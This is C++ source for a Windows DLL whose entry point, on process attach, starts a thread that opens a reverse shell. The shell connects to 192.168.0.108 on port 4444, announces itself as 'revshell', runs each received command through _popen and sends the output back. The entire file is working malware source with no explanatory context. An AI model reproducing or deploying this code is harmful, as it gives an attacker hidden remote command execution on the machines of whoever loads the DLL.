#include "pch.h"

std::string cmd;
std::string output;
WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;
struct addrinfo* result = NULL,
    * ptr = NULL,
    hints;
const char* protocol = "revshell";
char recvbuf[1024];
int recvbuflen = 1024;


std::string execute(const char* cmd)
{
    char buffer[256];
    std::string result = "";
    FILE* pipe = _popen((cmd + (std::string)" 2>&1 ").c_str(), "r");
    while (fgets(buffer, sizeof(buffer), pipe))
    {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}


DWORD WINAPI exec(LPVOID lpParam)
{
    output = execute(cmd.c_str());
    send(ConnectSocket, output.c_str(), (int)strlen(output.c_str()), 0);
    return 1;
}

DWORD WINAPI exploit(LPVOID lpParam)
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    getaddrinfo("192.168.0.108", "4444", &hints, &result);

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);

        connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        break;
    }

    freeaddrinfo(result);

    send(ConnectSocket, protocol, (int)strlen(protocol), 0);

    while (true)
    {
        recv(ConnectSocket, recvbuf, recvbuflen, 0);

        cmd = "";

        for (char let : recvbuf)
        {
            if (let == '0')
            {
                break;
            }
            cmd += let;
        }

        if (cmd == "shut")
        {
            break;
        }

        auto thread = CreateThread(NULL, 0, &exec, NULL, 0, NULL);
        CloseHandle(thread);
        
    }

    shutdown(ConnectSocket, SD_SEND);

    closesocket(ConnectSocket);
    WSACleanup();

    return 1;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        auto thread = CreateThread(NULL, 0, &exploit, NULL, 0, NULL);
        CloseHandle(thread);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

